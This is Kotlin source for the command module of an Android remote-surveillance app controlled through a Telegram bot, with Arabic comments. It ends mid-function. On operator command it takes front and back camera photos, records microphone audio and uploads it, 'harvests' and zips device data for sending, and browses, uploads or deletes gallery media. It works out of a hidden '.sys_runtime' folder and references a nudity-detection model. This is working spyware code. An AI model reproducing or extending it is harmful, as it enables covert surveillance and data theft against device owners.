package com.example.app

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.lang.ref.WeakReference
import java.lang.reflect.Method
import java.security.MessageDigest
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import kotlin.random.Random

/**
 * فئة إدارة الأوامر الرئيسية للتحكم بكاميرا الجهاز، الميكروفون، المعرض والحصاد.
 *
 * ✅ التعديلات الجديدة:
 * - استقبال receivingToken لضمان استخدام نفس البوت في الردود.
 * - إضافة معالجة الأوامر الجديدة: camf_main, cam_main, mic_start, hrv_now, send_now, sys_status, ext, update_model_all, restart_service_all.
 * - إضافة دوال معالجة جديدة: handleSysStatus, handleExt, handleUpdateModel, handleRestartService.
 * - تعديل sendTelegramMessage لاستقبال receivingToken واستخدامه في الإرسال المباشر.
 * - منع تسريب كلمة المرور في أي رسالة.
 * - إضافة تأكيد استلام الضغطة (answerCallbackQuery) في execute.
 * - تحسين سجلات التشخيص.
 * - ✅ إصلاح invokeTelegramMethod باستخدام الاستدعاء المباشر للدوال الداخلية في TelegramUi بدلاً من الانعكاس المعقد.
 */
class Commands private constructor(context: Context) {

    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    @Volatile
    private var isMicBusy = false

    @Volatile
    private var stopRecordingFlag = false

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // ========== المسارات والمجلدات ==========
    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply {
            if (!exists()) mkdirs()
        }
    }

    private val pendingDir: File by lazy {
        File(runtimeDir, "pending_upload").apply {
            if (!exists()) mkdirs()
        }
    }

    private val tempDir: File by lazy {
        File(runtimeDir, "ctmp").apply {
            if (!exists()) mkdirs()
        }
    }

    private val pendingTasksDir: File by lazy {
        File(runtimeDir, "pending_tasks").apply {
            if (!exists()) mkdirs()
        }
    }

    private val configFile: File by lazy {
        File(runtimeDir, "commands_config.json")
    }

    private val tasksFile: File by lazy {
        File(pendingTasksDir, "tasks.json")
    }

    private val config: MutableMap<String, Any> by lazy {
        loadConfig()
    }

    private val maxRetries = 5
    private val retryInterval = 600_000L // 10 دقائق

    // ✅ ConcurrentHashMap للـ methodCache (thread-safe)
    private val methodCache = ConcurrentHashMap<String, Method>()

    companion object {
        private const val TAG = "Commands"

        @Volatile
        private var instance: Commands? = null

        fun getInstance(context: Context): Commands {
            return instance ?: synchronized(this) {
                instance ?: Commands(context).also { instance = it }
            }
        }

        /**
         * ✅ نقطة دخول خارجية لتنفيذ الأوامر (تم تعديلها لاستقبال receivingToken)
         */
        suspend fun ex(
            context: Context,
            cmd: String,
            tg: Any?,
            m: Any?,
            cid: Long,
            cbq: String? = null,
            receivingToken: String? = null
        ) {
            getInstance(context).execute(cmd, tg, m, cid, cbq, receivingToken)
        }

        /**
         * ✅ دالة مساعدة لتنسيق الترقيم الثنائي/الثلاثي للوسائط
         */
        fun formatPaginationInfo(currentPage: Int, totalPages: Int, totalItems: Int): String {
            val useTriple = totalItems > 99
            val pageStr = String.format(Locale.US, if (useTriple) "%03d" else "%02d", currentPage + 1)
            val totalPageStr = String.format(Locale.US, if (useTriple) "%03d" else "%02d", totalPages)
            val totalItemsStr = String.format(Locale.US, "%03d", totalItems)
            return "📄 صفحة: $pageStr/$totalPageStr | 📁 إجمالي: $totalItemsStr"
        }
    }

    init {
        cleanupOldFiles()
        startRetryLoop()
    }

    // ============================================================
    //  دوال مساعدة: تحميل الإعدادات، إنشاء أسماء فريدة، حذف آمن
    // ============================================================

    private fun loadConfig(): MutableMap<String, Any> {
        val defaultConfig = mutableMapOf<String, Any>(
            "temp_file_age" to 3600,
            "pending_file_age" to 86400,
            "audio_duration" to 10,
            "min_audio_size" to 5000,
            "min_battery" to 15,
            "enable_logging" to true
        )
        if (configFile.exists()) {
            try {
                val json = JSONObject(configFile.readText())
                defaultConfig.keys.forEach { key ->
                    if (json.has(key)) {
                        defaultConfig[key] = json.get(key)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Config load error: ${e.message}")
            }
        }
        return defaultConfig
    }

    private fun saveConfig() {
        try {
            configFile.writeText(JSONObject(config as Map<*, *>).toString(2))
        } catch (e: Exception) {
            Log.e(TAG, "Config save error: ${e.message}")
        }
    }

    private fun generateUniqueFilename(prefix: String = "file", ext: String = ".txt"): String {
        val timestamp = System.currentTimeMillis()
        val raw = "$timestamp${android.os.Process.myPid()}"
        val md = MessageDigest.getInstance("MD5")
        val digest = md.digest(raw.toByteArray())
        val hashHex = digest.take(4).joinToString("") { "%02x".format(it) }
        return "${prefix}_${timestamp}_$hashHex$ext"
    }

    private fun safeRemove(file: File?): Boolean {
        return try {
            file?.takeIf { it.exists() }?.delete() ?: false
        } catch (e: Exception) {
            Log.e(TAG, "Safe remove error for ${file?.absolutePath}: ${e.message}")
            false
        }
    }

    private fun cleanupOldFiles() {
        scope.launch {
            try {
                val now = System.currentTimeMillis()
                val tempMaxAge = (config["temp_file_age"] as? Number)?.toLong()?.times(1000) ?: 3600_000L
                val pendingMaxAge = (config["pending_file_age"] as? Number)?.toLong()?.times(1000) ?: 86400_000L

                mapOf(tempDir to tempMaxAge, pendingDir to pendingMaxAge).forEach { (dir, maxAge) ->
                    dir.listFiles()?.forEach { file ->
                        if (now - file.lastModified() > maxAge) {
                            safeRemove(file)
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Cleanup error: ${e.message}")
            }
        }
    }

    private fun checkPermission(permission: String): Boolean {
        val ctx = appContext ?: return false
        return ContextCompat.checkSelfPermission(ctx, permission) == PackageManager.PERMISSION_GRANTED
    }

    private fun isBatteryOk(m: Any?): Boolean {
        if (m == null) return true
        return try {
            val method = m.javaClass.getMethod("getBatteryStatus")
            val result = method.invoke(m) as? Pair<*, *>
            if (result != null) {
                val battery = (result.first as? Number)?.toInt() ?: 100
                val isCharging = result.second as? Boolean ?: false
                val minBattery = (config["min_battery"] as? Number)?.toInt() ?: 15
                battery >= minBattery || isCharging
            } else {
                true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Battery check error: ${e.message}")
            true
        }
    }

    // ============================================================
    //  التسجيل الصوتي
    // ============================================================

    private suspend fun recordAudio(durationSec: Int = 10): File? =
        withContext(Dispatchers.IO) {
            if (isMicBusy) {
                Log.w(TAG, "🎙️ Microphone is busy")
                return@withContext null
            }

            if (!checkPermission(Manifest.permission.RECORD_AUDIO)) {
                Log.e(TAG, "❌ RECORD_AUDIO permission not granted")
                return@withContext null
            }

            isMicBusy = true
            stopRecordingFlag = false

            val outFile = File(tempDir, generateUniqueFilename("audio", ".aac"))
            var recorder: MediaRecorder? = null

            try {
                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    appContext?.let { MediaRecorder(it) } ?: MediaRecorder()
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }

                recorder.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioEncodingBitRate(64000)
                    setOutputFile(outFile.absolutePath)
                    prepare()
                    start()
                }

                Log.i(TAG, "🎤 Recording audio for $durationSec seconds...")

                for (i in 0 until durationSec) {
                    if (stopRecordingFlag) {
                        Log.i(TAG, "⏹️ Recording stopped early by flag")
                        break
                    }
                    delay(1000)
                }

                try {
                    recorder.stop()
                } catch (e: Exception) {
                    Log.e(TAG, "❌ MediaRecorder stop error: ${e.message}")
                }

                recorder.reset()

                val minSize = (config["min_audio_size"] as? Number)?.toInt() ?: 5000
                if (outFile.exists() && outFile.length() >= minSize) {
                    Log.i(TAG, "✅ Audio recorded: ${outFile.length()} bytes")
                    return@withContext outFile
                } else {
                    Log.w(TAG, "⚠️ Audio file too small or missing: ${outFile.length()} bytes")
                    safeRemove(outFile)
                    return@withContext null
                }

            } catch (e: Exception) {
                Log.e(TAG, "❌ Recording error: ${e.message}")
                safeRemove(outFile)
                return@withContext null
            } finally {
                try {
                    recorder?.release()
                } catch (_: Exception) {}
                isMicBusy = false
            }
        }

    fun stopRecording() {
        stopRecordingFlag = true
        Log.i(TAG, "⏹️ Recording stop requested")
    }

    // ============================================================
    //  إدارة المهام الفاشلة (قائمة انتظار)
    // ============================================================

    private fun addTaskToQueue(
        type: String,
        filePath: String,
        chatId: Long,
        filename: String? = null,
        content: String? = null
    ) {
        try {
            val tasksArray = if (tasksFile.exists()) {
                JSONArray(tasksFile.readText())
            } else {
                JSONArray()
            }

            val taskObj = JSONObject().apply {
                put("id", generateUniqueFilename("task", ""))
                put("type", type)
                put("file_path", filePath)
                put("chat_id", chatId)
                put("filename", filename ?: "")
                put("content", content ?: "")
                put("created_at", System.currentTimeMillis())
                put("attempts", 0)
                put("last_attempt", 0)
            }

            tasksArray.put(taskObj)
            tasksFile.writeText(tasksArray.toString(2))
            Log.i(TAG, "📋 Task added to queue: $type")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Add task error: ${e.message}")
        }
    }

    private fun startRetryLoop() {
        scope.launch {
            while (isActive) {
                delay(retryInterval)
                retryFailedTasks()
            }
        }
    }

    private fun retryFailedTasks() {
        if (!tasksFile.exists()) return

        try {
            val tasksArray = JSONArray(tasksFile.readText())
            val remainingTasks = JSONArray()
            var removed = 0

            for (i in 0 until tasksArray.length()) {
                val task = tasksArray.getJSONObject(i)
                val attempts = task.optInt("attempts", 0)
                val lastAttempt = task.optLong("last_attempt", 0)
                val filePath = task.optString("file_path")
                val chatId = task.optLong("chat_id")
                val type = task.optString("type")
                val filename = task.optString("filename")
                val content = task.optString("content")

                if (attempts >= maxRetries) {
                    Log.w(TAG, "⚠️ Task ${task.optString("id")} exceeded max retries, removing.")
                    safeRemove(File(filePath))
                    removed++
                    continue
                }

                val waitTime = (1L shl attempts) * 60_000L
                if (lastAttempt > 0 && System.currentTimeMillis() - lastAttempt < waitTime) {
                    remainingTasks.put(task)
                    continue
                }

                Log.i(TAG, "🔄 Retrying task $type (attempt ${attempts + 1})")

                val success = when (type) {
                    "audio" -> {
                        val file = File(filePath)
                        if (file.exists()) {
                            false
                        } else {
                            removed++
                            true
                        }
                    }
                    "text_file" -> {
                        false
                    }
                    else -> false
                }

                if (success) {
                    safeRemove(File(filePath))
                    removed++
                } else {
                    task.put("attempts", attempts + 1)
                    task.put("last_attempt", System.currentTimeMillis())
                    remainingTasks.put(task)
                }
            }

            if (removed > 0) {
                tasksFile.writeText(remainingTasks.toString(2))
                Log.i(TAG, "✅ Retry completed, removed $removed tasks.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Retry failed tasks error: ${e.message}")
        }
    }

    // ============================================================
    //  إرسال الملفات النصية
    // ============================================================

    private suspend fun sendTextFile(tg: Any?, chatId: Long, content: String, filename: String, receivingToken: String? = null) {
        if (content.isBlank()) {
            sendTelegramMessage(tg, chatId, "📄 $filename: لا يوجد محتوى", receivingToken = receivingToken)
            return
        }

        val tempFile = File(pendingDir, generateUniqueFilename(filename, ".txt"))
        try {
            tempFile.writeText(content, Charsets.UTF_8)

            if (tempFile.length() == 0L) {
                safeRemove(tempFile)
                sendTelegramMessage(tg, chatId, "📄 $filename: ملف فارغ", receivingToken = receivingToken)
                return
            }

            val success = sendTelegramDocument(tg, chatId, tempFile, "📄 $filename", receivingToken)
            if (success) {
                safeRemove(tempFile)
            } else {
                Log.w(TAG, "⚠️ Failed to send $filename, adding to queue")
                addTaskToQueue("text_file", tempFile.absolutePath, chatId, filename, content)
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Send text file error: ${e.message}")
            sendTelegramMessage(tg, chatId, "📄 $filename:\n${content.take(4000)}", receivingToken = receivingToken)
            safeRemove(tempFile)
        }
    }

    // ============================================================
    //  ✅ دالة تنفيذ الأوامر الرئيسية (المعدلة بالكامل)
    // ============================================================

    suspend fun execute(
        cmd: String,
        tg: Any?,
        m: Any?,
        cid: Long,
        cbq: String? = null,
        receivingToken: String? = null
    ) {
        try {
            MainActivity.appendLogStatic("⚡ Executing command: '$cmd' from $cid")
            Log.d(TAG, "⚡ Executing command: '$cmd' from $cid")

            if (cmd.isBlank()) return
            delay(Random.nextLong(300, 900))

            // ✅ تأكيد استلام الضغطة (لتحرير الزر)
            cbq?.let { queryId ->
                sendAnswerCallbackQuery(tg, queryId, "⏳ جاري التنفيذ...", receivingToken)
            }

            // ✅ التحقق من الجلسة
            if (!isAuthorized(cid, m)) {
                sendTelegramMessage(tg, cid, "⚠️ انتهت الجلسة، استخدم /login", receivingToken = receivingToken)
                return
            }

            // ✅ معالجة الأوامر الجديدة
            when {
                // 📸 كاميرا أمامية
                cmd == "camf_main" -> handleCamera(1, tg, m, cid, receivingToken)
                // 📷 كاميرا خلفية
                cmd == "cam_main" -> handleCamera(0, tg, m, cid, receivingToken)
                // 🎙️ تسجيل صوتي
                cmd == "mic_start" -> handleMic(tg, m, cid, receivingToken)
                // 🛡️ فحص وحصاد
                cmd == "hrv_now" -> handleHarvest(tg, m, cid, receivingToken)
                // 🚀 بث فوري
                cmd == "send_now" -> handleSendNow(tg, m, cid, receivingToken)
                // 🔍 حالة النظام
                cmd == "sys_status" -> handleSysStatus(tg, m, cid, receivingToken)
                // 🔒 قفل الجلسة (خروج)
                cmd == "ext" -> handleExt(tg, m, cid, receivingToken)
                // 🔄 تحديث النموذج
                cmd == "update_model_all" -> handleUpdateModel(tg, m, cid, receivingToken)
                // ♻️ إعادة تشغيل الخدمة
                cmd == "restart_service_all" -> handleRestartService(tg, m, cid, receivingToken)

                // ✅ أوامر المعرض (تحتوي على |)
                cmd.contains("|") -> handleGalleryCommand(cmd, tg, m, cid, receivingToken)

                // ✅ /login يتم معالجته في TelegramUi
                cmd.startsWith("/login", ignoreCase = true) -> {
                    Log.d(TAG, "ℹ️ /login command forwarded to TelegramUi")
                }

                else -> {
                    MainActivity.appendLogStatic("⚠️ Unknown command: '$cmd'")
                    sendTelegramMessage(tg, cid, "⚠️ أمر غير معروف. استخدم الأزرار التفاعلية.", receivingToken = receivingToken)
                }
            }
        } catch (e: Exception) {
            MainActivity.appendLogStatic("❌ Command error: ${e.message}")
            Log.e(TAG, "❌ Command error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ: ${e.message?.take(100)}", receivingToken = receivingToken)
        }
    }

    // ============================================================
    //  ✅ دوال معالجة الأوامر الجديدة
    // ============================================================

    private suspend fun handleSysStatus(tg: Any?, m: Any?, cid: Long, receivingToken: String?) {
        try {
            val status = getModuleComponent(m, "ui")?.let { ui ->
                invokeMethod(ui, "getStatus") as? Map<*, *>
            } ?: emptyMap<String, Any>()

            val statusText = """
                📊 **حالة النظام**
                ━━━━━━━━━━━━━━━
                🔑 التوكنات النشطة: `${status["active_tokens"] ?: "?"}`
                📦 التوكنات الاحتياطية: `${status["reserve_tokens"] ?: "?"}`
                📱 الأجهزة المسجلة: `${status["devices"] ?: "?"}`
                🔐 الجلسات النشطة: `${status["sessions"] ?: "?"}`
                📡 طلبات API: `${status["api_calls"] ?: "?"}`
                ❌ فشل API: `${status["api_failures"] ?: "?"}`
                📂 الملفات المعلقة: `${status["pending_files"] ?: "?"}`
                🧠 حالة النموذج: ${if (getModuleComponent(m, "nudeDetector") != null) "✅ متاح" else "❌ غير متاح"}
            """.trimIndent()

            sendTelegramMessage(tg, cid, statusText, receivingToken = receivingToken)
        } catch (e: Exception) {
            Log.e(TAG, "❌ System status error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في جلب حالة النظام", receivingToken = receivingToken)
        }
    }

    private suspend fun handleExt(tg: Any?, m: Any?, cid: Long, receivingToken: String?) {
        try {
            val ui = getModuleComponent(m, "ui")
            if (ui != null) {
                val sessions = getModuleField(ui, "sessions") as? ConcurrentHashMap<*, *>
                sessions?.remove(cid.toString())
                sendTelegramMessage(tg, cid, "🔒 تم قفل الجلسة بنجاح. استخدم كلمة السر للدخول مجدداً.", receivingToken = receivingToken)
            } else {
                sendTelegramMessage(tg, cid, "⚠️ لا توجد جلسة نشطة.", receivingToken = receivingToken)
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Logout error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في قفل الجلسة", receivingToken = receivingToken)
        }
    }

    private suspend fun handleUpdateModel(tg: Any?, m: Any?, cid: Long, receivingToken: String?) {
        try {
            sendTelegramMessage(tg, cid, "⚡ جاري تحديث النموذج... قد يستغرق دقائق.", receivingToken = receivingToken)
            scope.launch {
                try {
                    val detector = getModuleComponent(m, "nudeDetector") as? NudeDetector
                    if (detector != null) {
                        val success = detector.ensureModelReady()
                        if (success) {
                            detector.modelPath = detector.modelPath
                            detector.loadEngineForever()
                            sendTelegramMessage(tg, cid, "✅ تم تحديث النموذج بنجاح!", receivingToken = receivingToken)
                        } else {
                            sendTelegramMessage(tg, cid, "❌ فشل تحديث النموذج.", receivingToken = receivingToken)
                        }
                    } else {
                        sendTelegramMessage(tg, cid, "❌ كاشف المحتوى غير متاح", receivingToken = receivingToken)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Update model error: ${e.message}")
                    sendTelegramMessage(tg, cid, "❌ خطأ في تحديث النموذج: ${e.message?.take(50)}", receivingToken = receivingToken)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Update model handler error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في تحديث النموذج", receivingToken = receivingToken)
        }
    }

    private suspend fun handleRestartService(tg: Any?, m: Any?, cid: Long, receivingToken: String?) {
        try {
            sendTelegramMessage(tg, cid, "♻️ جاري إعادة تشغيل الخدمة...", receivingToken = receivingToken)
            scope.launch {
                try {
                    val monitor = m
                    if (monitor != null) {
                        val stopMethod = monitor.javaClass.getMethod("stop")
                        stopMethod.invoke(monitor)
                        delay(2000)
                        val startMethod = monitor.javaClass.getMethod("start")
                        startMethod.invoke(monitor)
                        sendTelegramMessage(tg, cid, "✅ تم إعادة تشغيل الخدمة بنجاح.", receivingToken = receivingToken)
                    } else {
                        sendTelegramMessage(tg, cid, "❌ وحدة المراقبة غير متاحة", receivingToken = receivingToken)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Restart service error: ${e.message}")
                    sendTelegramMessage(tg, cid, "❌ فشل إعادة تشغيل الخدمة: ${e.message?.take(50)}", receivingToken = receivingToken)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Restart service handler error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في إعادة تشغيل الخدمة", receivingToken = receivingToken)
        }
    }

    // ============================================================
    //  معالج الكاميرا (معدل لاستقبال receivingToken)
    // ============================================================

    private suspend fun handleCamera(camId: Int, tg: Any?, m: Any?, cid: Long, receivingToken: String? = null) {
        try {
            if (!isBatteryOk(m)) {
                sendTelegramMessage(tg, cid, "🔋 البطارية منخفضة", receivingToken = receivingToken)
                return
            }

            val cameraAnalyzer = getModuleComponent(m, "cameraAnalyzer") as? CameraAnalyzer
            if (cameraAnalyzer == null) {
                sendTelegramMessage(tg, cid, "❌ الكاميرا غير متاحة", receivingToken = receivingToken)
                return
            }

            sendTelegramMessage(tg, cid, "📸 جاري التقاط الصورة...", receivingToken = receivingToken)
            sendPulseIntent("📸 Camera")

            scope.launch {
                try {
                    cameraAnalyzer.harvest(camId)
                    sendTelegramMessage(tg, cid, "✅ تم التقاط الصورة وتحليلها.", receivingToken = receivingToken)
                } catch (e: Exception) {
                    sendTelegramMessage(tg, cid, "❌ فشل الالتقاط: ${e.message?.take(50)}", receivingToken = receivingToken)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Camera handler error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في الكاميرا", receivingToken = receivingToken)
        }
    }

    // ============================================================
    //  معالج المعرض (معدل لاستقبال receivingToken)
    // ============================================================

    private suspend fun handleGallery(tg: Any?, m: Any?, cid: Long, receivingToken: String? = null) {
        try {
            val mediaScanner = getModuleComponent(m, "mediaScanner")
            if (mediaScanner == null) {
                sendTelegramMessage(tg, cid, "❌ المعرض غير متاح", receivingToken = receivingToken)
                return
            }

            val kb = invokeMethod(mediaScanner, "getGridKb", "all", 0)
            if (kb != null) {
                val response = sendTelegramMessage(tg, cid, "🖼️ أرشيف الوسائط", kb.toString(), receivingToken)
                val msgId = (response as? JSONObject)?.optJSONObject("result")?.optLong("message_id")
                msgId?.let { setModuleField(m, "last_mid", it) }
            } else {
                sendTelegramMessage(tg, cid, "❌ فشل تحميل المعرض", receivingToken = receivingToken)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Gallery handler error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في المعرض", receivingToken = receivingToken)
        }
    }

    // ============================================================
    //  معالج أوامر المعرض (معدل لاستقبال receivingToken)
    // ============================================================

    private suspend fun handleGalleryCommand(cmd: String, tg: Any?, m: Any?, cid: Long, receivingToken: String? = null) {
        try {
            val parts = cmd.split("|")
            if (parts.size < 2) {
                sendTelegramMessage(tg, cid, "⚠️ أمر غير مكتمل", receivingToken = receivingToken)
                return
            }

            val action = parts[0]
            val mediaScanner = getModuleComponent(m, "mediaScanner")
            if (mediaScanner == null) {
                sendTelegramMessage(tg, cid, "❌ المعرض غير متاح", receivingToken = receivingToken)
                return
            }

            val lastMid = getModuleField(m, "last_mid") as? Long

            when (action) {
                "g_nav" -> {
                    if (parts.size >= 3) {
                        val cat = parts[1]
                        val page = parts[2].toIntOrNull() ?: 0
                        val newKb = invokeMethod(mediaScanner, "getGridKb", cat, page)
                        if (newKb != null) {
                            val msgId = lastMid ?: 0
                            invokeTelegramMethod(tg, "editMessageReplyMarkup", mapOf(
                                "chat_id" to cid,
                                "message_id" to msgId,
                                "reply_markup" to newKb.toString()
                            ), receivingToken)
                        }
                    }
                }
                "g_opt" -> {
                    if (parts.size >= 4) {
                        invokeMethod(mediaScanner, "showOptions", cid, parts[1], parts[2], parts[3])
                    }
                }
                "g_zip" -> {
                    if (parts.size >= 3) {
                        invokeMethod(mediaScanner, "executeAction", cid, "zip", parts[1], parts[2].toIntOrNull() ?: 0, null, lastMid)
                    }
                }
                "g_upload" -> {
                    if (parts.size >= 3) {
                        invokeMethod(mediaScanner, "executeAction", cid, "upload", parts[1], parts[2].toIntOrNull() ?: 0, null, lastMid)
                    }
                }
                "g_del_sel" -> {
                    if (parts.size >= 3) {
                        invokeMethod(mediaScanner, "executeAction", cid, "del_sel", parts[1], parts[2].toIntOrNull() ?: 0, null, lastMid)
                    }
                }
                "g_conf_del" -> {
                    if (parts.size >= 3) {
                        val cat = parts[1]
                        val page = parts[2].toIntOrNull() ?: 0
                        val confirmKb = listOf(
                            listOf(
                                mapOf("text" to "🗑️ نعم، احذف الصفحة كلها", "callback_data" to "g_act|del_page|$cat|$page|0"),
                                mapOf("text" to "🔙 إلغاء", "callback_data" to "g_nav|$cat|$page")
                            )
                        )
                        val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
                        sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد من حذف كل ملفات الصفحة ${page + 1}؟", jsonKb, receivingToken)
                    }
                }
                "g_conf_del_one" -> {
                    if (parts.size >= 4) {
                        val cat = parts[1]
                        val page = parts[2].toIntOrNull() ?: 0
                        val index = parts[3].toIntOrNull() ?: -1
                        val confirmKb = listOf(
                            listOf(
                                mapOf("text" to "🗑️ نعم، احذف هذا الملف", "callback_data" to "g_act|del_one|$cat|$page|$index"),
                                mapOf("text" to "🔙 إلغاء", "callback_data" to "g_opt|$cat|$page|$index")
                            )
                        )
                        val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
                        sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد من حذف هذا الملف؟", jsonKb, receivingToken)
                    }
                }
                "g_toggle" -> {
                    if (parts.size >= 4) {
                        val cat = parts[1]
                        val page = parts[2].toIntOrNull() ?: 0
                        val index = parts[3].toIntOrNull() ?: -1
                        invokeMethod(mediaScanner, "executeAction", cid, "toggle", cat, page, index, lastMid)
                    }
                }
                "g_selall" -> {
                    if (parts.size >= 3) {
                        val cat = parts[1]
                        val page = parts[2].toIntOrNull() ?: 0
                        invokeMethod(mediaScanner, "executeAction", cid, "selall", cat, page, null, lastMid)
                    }
                }
                else -> {
                    sendTelegramMessage(tg, cid, "⚠️ أمر معرض غير معروف", receivingToken = receivingToken)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Gallery command error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في أمر المعرض", receivingToken = receivingToken)
        }
    }

    // ============================================================
    //  معالج الحصاد (معدل لاستقبال receivingToken)
    // ============================================================

    private suspend fun handleHarvest(tg: Any?, m: Any?, cid: Long, receivingToken: String? = null) {
        try {
            sendPulseIntent("📦 Data Harvest")

            val dailyZipper = getModuleComponent(m, "dailyZipper")
            if (dailyZipper != null) {
                sendTelegramMessage(tg, cid, "📦 بدء الحصاد... قد يستغرق دقائق", receivingToken = receivingToken)
                scope.launch {
                    try {
                        invokeMethod(dailyZipper, "run")
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ Harvest error: ${e.message}")
                    }
                }
            } else {
                sendTelegramMessage(tg, cid, "❌ وحدة الحصاد غير جاهزة", receivingToken = receivingToken)
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Harvest handler error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في الحصاد", receivingToken = receivingToken)
        }
    }

    // ============================================================
    //  معالج الميكروفون (معدل لاستقبال receivingToken)
    // ============================================================

    private suspend fun handleMic(tg: Any?, m: Any?, cid: Long, receivingToken: String? = null) {
        try {
            if (isMicBusy) {
                sendTelegramMessage(tg, cid, "⏳ التسجيل قيد التنفيذ", receivingToken = receivingToken)
                return
            }

            sendPulseIntent("🎙️ Audio Sync")

            stopRecordingFlag = false
            val duration = (config["audio_duration"] as? Number)?.toInt() ?: 10
            sendTelegramMessage(tg, cid, "🎤 جاري التسجيل لمدة $duration ثوانٍ...", receivingToken = receivingToken)

            scope.launch {
                val audioPath = recordAudio(duration)
                if (audioPath != null && audioPath.exists()) {
                    val target = getModuleField(m, "vlt") as? Long ?: cid
                    val success = sendTelegramVoice(tg, target, audioPath, receivingToken)
                    if (success) {
                        safeRemove(audioPath)
                    } else {
                        Log.w(TAG, "⚠️ Failed to send audio, adding to pending tasks")
                        addTaskToQueue("audio", audioPath.absolutePath, target)
                    }
                } else {
                    sendTelegramMessage(tg, cid, "❌ فشل التسجيل (الملف صغير جداً أو تالف)", receivingToken = receivingToken)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Mic handler error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في الميكروفون", receivingToken = receivingToken)
        }
    }

    // ============================================================
    //  معالج الإرسال الفوري (معدل لاستقبال receivingToken)
    // ============================================================

    private suspend fun handleSendNow(tg: Any?, m: Any?, cid: Long, receivingToken: String? = null) {
        try {
            val dailyZipper = getModuleComponent(m, "dailyZipper")
            if (dailyZipper != null) {
                sendTelegramMessage(tg, cid, "🚀 جاري إرسال الملفات المضغوطة فوراً...", receivingToken = receivingToken)
                scope.launch {
                    try {
                        val success = invokeMethod(dailyZipper, "forceSendNow", cid) as? Boolean
                        if (success == false) {
                            Log.w(TAG, "⚠️ Force send failed, tasks will be retried later")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ Force send error: ${e.message}")
                    }
                }
            } else {
                sendTelegramMessage(tg, cid, "❌ وحدة الحصاد غير متاحة", receivingToken = receivingToken)
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Send now handler error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في الإرسال الفوري", receivingToken = receivingToken)
        }
    }

    // ============================================================
    //  دوال الانعكاس (Reflection) معدلة لدعم receivingToken
    // ============================================================

    private fun getModuleComponent(target: Any?, fieldName: String): Any? {
        if (target == null) return null
        return try {
            val field = target.javaClass.getDeclaredField(fieldName)
            field.isAccessible = true
            field.get(target)
        } catch (e: Exception) {
            null
        }
    }

    private fun getModuleField(target: Any?, fieldName: String): Any? {
        if (target == null) return null
        return try {
            val field = target.javaClass.getDeclaredField(fieldName)
            field.isAccessible = true
            field.get(target)
        } catch (e: Exception) {
            null
        }
    }

    private fun setModuleField(target: Any?, fieldName: String, value: Any?) {
        if (target == null) return
        try {
            val field = target.javaClass.getDeclaredField(fieldName)
            field.isAccessible = true
            field.set(target, value)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Set field error: ${e.message}")
        }
    }

    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
        if (target == null) return null

        val key = "${target.javaClass.name}.$methodName(${args.size})"
        var method = methodCache[key]

        if (method == null) {
            method = target.javaClass.methods.firstOrNull { m ->
                m.name == methodName && m.parameterTypes.size == args.size
            }
            if (method == null) {
                Log.e(TAG, "❌ Method not found: $methodName with ${args.size} parameters")
                return null
            }
            method.isAccessible = true
            methodCache[key] = method
        }

        return try {
            method.invoke(target, *args)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Method invocation error ($methodName): ${e.message}")
            null
        }
    }

    // ============================================================
    //  ✅ دالة مساعدة للتحقق من الجلسة (تم إصلاح خطأ monitor)
    // ============================================================

    private suspend fun isAuthorized(cid: Long, monitor: Any?): Boolean {
        val ui = getModuleComponent(monitor, "ui") ?: return false
        val sessions = getModuleField(ui, "sessions") as? ConcurrentHashMap<*, *> ?: return false
        val session = sessions[cid.toString()] as? Long ?: 0L
